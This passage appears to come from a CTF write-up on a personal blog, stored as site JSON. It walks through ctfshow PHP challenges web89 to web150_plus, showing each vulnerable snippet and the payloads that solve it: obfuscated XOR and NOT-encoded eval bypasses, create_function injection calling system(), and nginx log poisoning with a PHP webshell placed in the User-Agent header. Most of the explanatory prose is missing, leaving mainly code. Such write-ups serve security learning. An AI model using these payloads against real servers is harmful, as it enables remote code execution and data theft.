if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123;</span><br><span class=\"line\">                die(&#x27;get out hacker!&#x27;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;return 1==phpinfo()||1;&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>phpinfo()</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v3===(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)||&amp;v2=1</span><br><span class=\"line\"></span><br><span class=\"line\">?v1=1&amp;v3=|(&#x27;%13%19%13%14%05%0d&#x27;|&#x27;%60%60%60%60%60%60&#x27;)(&#x27;%14%01%03%20%06%02&#x27;|&#x27;%60%60%60%20%60%28&#x27;)|&amp;v2=1</span><br><span class=\"line\"></span><br><span class=\"line\">?v1=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web147\"><a href=\"#web147\" class=\"headerlink\" title=\"web147\"></a>web147</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_POST[&#x27;ctf&#x27;]))&#123;</span><br><span class=\"line\">    $ctfshow = $_POST[&#x27;ctf&#x27;];</span><br><span class=\"line\">    if(!preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$ctfshow)) &#123;</span><br><span class=\"line\">        $ctfshow(&#x27;&#x27;,$_GET[&#x27;show&#x27;]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>wp</p>\n<p>create_function()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create_function(&#x27;$a&#x27;,&#x27;echo $a.&quot;123&quot;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">function f($a) &#123;</span><br><span class=\"line\">  echo $a.&quot;123&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p> echo 1;}phpinfo();&#x2F;&#x2F;<br> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function f($a) &#123;</span><br><span class=\"line\">  echo 1;&#125;phpinfo();//</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">phpinfo()</span><br><span class=\"line\">fuzz%5c</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get: ?show=echo 123;&#125;system(&#x27;tac f*&#x27;);//</span><br><span class=\"line\">post: ctf=%5ccreate_function</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web148\"><a href=\"#web148\" class=\"headerlink\" title=\"web148\"></a>web148</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include &#x27;flag.php&#x27;;</span><br><span class=\"line\">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class=\"line\">    $code=$_GET[&#x27;code&#x27;];</span><br><span class=\"line\">    if(preg_match(&quot;/[A-Za-z0-9_\\%\\\\|\\~\\&#x27;\\,\\.\\:\\@\\&amp;\\*\\+\\- ]+/&quot;,$code))&#123;</span><br><span class=\"line\">        die(&quot;error&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @eval($code);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function get_ctfshow_fl0g()&#123;</span><br><span class=\"line\">    echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%02&quot;^&quot;%7d%60%60%21%60%28&quot;);</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web149\"><a href=\"#web149\" class=\"headerlink\" title=\"web149\"></a>web149</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">$files = scandir(&#x27;./&#x27;); </span><br><span class=\"line\">foreach($files as $file) &#123;</span><br><span class=\"line\">    if(is_file($file))&#123;</span><br><span class=\"line\">        if ($file !== &quot;index.php&quot;) &#123;</span><br><span class=\"line\">            unlink($file);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">file_put_contents($_GET[&#x27;ctf&#x27;], $_POST[&#x27;show&#x27;]);</span><br><span class=\"line\"></span><br><span class=\"line\">$files = scandir(&#x27;./&#x27;); </span><br><span class=\"line\">foreach($files as $file) &#123;</span><br><span class=\"line\">    if(is_file($file))&#123;</span><br><span class=\"line\">        if ($file !== &quot;index.php&quot;) &#123;</span><br><span class=\"line\">            unlink($file);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p>index.php</p>\n<p></p>\n<p></p>\n<h3 id=\"web150\"><a href=\"#web150\" class=\"headerlink\" title=\"web150\"></a>web150</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">class CTFSHOW&#123;</span><br><span class=\"line\">    private $username;</span><br><span class=\"line\">    private $password;</span><br><span class=\"line\">    private $vip;</span><br><span class=\"line\">    private $secret;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;vip = 0;</span><br><span class=\"line\">        $this-&gt;secret = $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __destruct()&#123;</span><br><span class=\"line\">        echo $this-&gt;secret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function isVIP()&#123;</span><br><span class=\"line\">        return $this-&gt;vip?TRUE:FALSE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __autoload($class)&#123;</span><br><span class=\"line\">        if(isset($class))&#123;</span><br><span class=\"line\">            $class();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">#</span><br><span class=\"line\">$key = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class=\"line\">if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123;</span><br><span class=\"line\">    die(&quot;error&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ctf = $_POST[&#x27;ctf&#x27;];</span><br><span class=\"line\">extract($_GET);</span><br><span class=\"line\">if(class_exists($__CTFSHOW__))&#123;</span><br><span class=\"line\">    echo &quot;class is exists!&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123;</span><br><span class=\"line\">    include($ctf);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /?isVIP=1 HTTP/1.1</span><br><span class=\"line\">Host: 76d1b363-e52c-456b-aff5-8c0c5ad8c0ad.challenge.ctf.show</span><br><span class=\"line\">User-Agent: &lt;?php eval($_POST[1]);?&gt;</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Cookie: _ga=GA1.2.1418869291.1680592508</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 49</span><br><span class=\"line\"></span><br><span class=\"line\">ctf=/var/log/nginx/access.log&amp;1=system(&#x27;cat f*&#x27;);</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web150-plus\"><a href=\"#web150-plus\" class=\"headerlink\" title=\"web150_plus\"></a>web150_plus</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">class CTFSHOW&#123;</span><br><span class=\"line\">    private $username;</span><br><span class=\"line\">    private $password;</span><br><span class=\"line\">    private $vip;</span><br><span class=\"line\">    private $secret;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;vip = 0;</span><br><span class=\"line\">        $this-&gt;secret = $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __destruct()&#123;</span><br><span class=\"line\">        echo $this-&gt;secret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function isVIP()&#123;</span><br><span class=\"line\">        return $this-&gt;vip?TRUE:FALSE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __autoload($class)&#123;</span><br><span class=\"line\">        if(isset($class))&#123;</span><br><span class=\"line\">            $class();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">#</span><br><span class=\"line\">$key = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class=\"line\">if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123;</span><br><span class=\"line\">    die(&quot;error&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ctf = $_POST[&#x27;ctf&#x27;];</span><br><span class=\"line\">extract($_GET);</span><br><span class=\"line\">if(class_exists($__CTFSHOW__))&#123;</span><br><span class=\"line\">    echo &quot;class is exists!&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE &amp;&amp; strrpos($ctf,&quot;log&quot;)===FALSE)&#123;</span><br><span class=\"line\">    include($ctf);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>log</p>\n<blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__autoload()</span><br><span class=\"line\">__autoload  </span><br><span class=\"line\">?..CTFSHOW..=phpinfophpinfo</span><br><span class=\"line\">..CTFSHOW..__CTFSHOW__CTFSHOW</span><br><span class=\"line\">__autoload()phpinfophpinfo</span><br><span class=\"line\">getshell</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?..CTFSHOW..=phpinfo</span><br></pre></td></tr></table></figure>\n\n<p>php</p>\n<hr>\n<p></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"PHP\"><a href=\"#PHP\" class=\"headerlink\" title=\"PHP\"></a>PHP</h1><p>php</p>\n<h3 id=\"web89\"><a href=\"#web89\" class=\"headerlink\" title=\"web89\"></a>web89</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num))&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>preg_match(&quot;/[0-9]/&quot;, $num</code></p>\n<p><code>intval($num)</code><code>intval</code></p>\n<p><strong>intval()</strong></p>\n<blockquote>\n<p><br> var  integer  0 array  0 array<br> 1 </p>\n</blockquote>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">echo intval(1234);  //1234</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(042);  //34  08</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(0x1a);  //26 0x16</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(3e3);  //3000  3 X 10</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(&#x27;3e3&#x27;);  //3000</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(&quot;1234a&quot;);  //1234</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(4.2); //</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num[]=a</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web90\"><a href=\"#web90\" class=\"headerlink\" title=\"web90\"></a>web90</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num===&quot;4476&quot;)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)===4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        echo intval($num,0);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p><code>intval</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">intval ( mixed $var [, int $base = 10 ] )</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p> <code>base</code>  0 <code>var</code> </p>\n<ul>\n<li> 0x ( 0X)  16  (hex)</li>\n<li> 0  8 (octal)</li>\n<li> 10  (decimal)</li>\n</ul>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">intval(&#x27;4476a&#x27;,0)=4476</span><br><span class=\"line\">intval(&#x27;010574&#x27;,0)=4476</span><br><span class=\"line\">intval(&#x27;0x117c&#x27;,0)=4476</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<h3 id=\"web91\"><a href=\"#web91\" class=\"headerlink\" title=\"web91\"></a>web91</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show_source(__FILE__);</span><br><span class=\"line\">include(&#x27;flag.php&#x27;);</span><br><span class=\"line\">$a=$_GET[&#x27;cmd&#x27;];</span><br><span class=\"line\">if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;</span><br><span class=\"line\">        echo &#x27;hacker&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    echo &#x27;nonononono&#x27;;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p> <code></code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i (ignore)</span><br><span class=\"line\">g (global)</span><br><span class=\"line\">m (more)</span><br><span class=\"line\">s  . </span><br><span class=\"line\">U ;; </span><br><span class=\"line\">//:x ; </span><br><span class=\"line\">//:A ;</span><br><span class=\"line\">//:D $,; </span><br><span class=\"line\">//:e preg_replace(), ;  </span><br></pre></td></tr></table></figure>\n\n<p><code>(preg_match(&#39;/^php$/im&#39;, $a))</code>php</p>\n<p><code>(preg_match(&#39;/^php$/i&#39;, $a))</code>php</p>\n<blockquote>\n<p>preg_match()  preg_match_all() subject </p>\n</blockquote>\n<p><code>%0a</code>enter</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?cmd=%0aphp</span><br><span class=\"line\">?cmd=php%0a1   (php%0a)</span><br></pre></td></tr></table></figure>\n\n<p> <code>%0aphp</code>payload <code>php%0a1</code></p>\n<p><code>^php$</code><code>(preg_match(&#39;/^php$/i&#39;, $a))</code></p>\n<h3 id=\"web92\"><a href=\"#web92\" class=\"headerlink\" title=\"web92\"></a>web92</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num==4476)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)==4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        echo intval($num,0);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p>intval()$base0$var ePHP</p>\n</blockquote>\n<p>e0b0x</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=0b1000101111100</span><br><span class=\"line\">?num=0x117c</span><br><span class=\"line\">?num=4476e123</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web93\"><a href=\"#web93\" class=\"headerlink\" title=\"web93\"></a>web93</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span 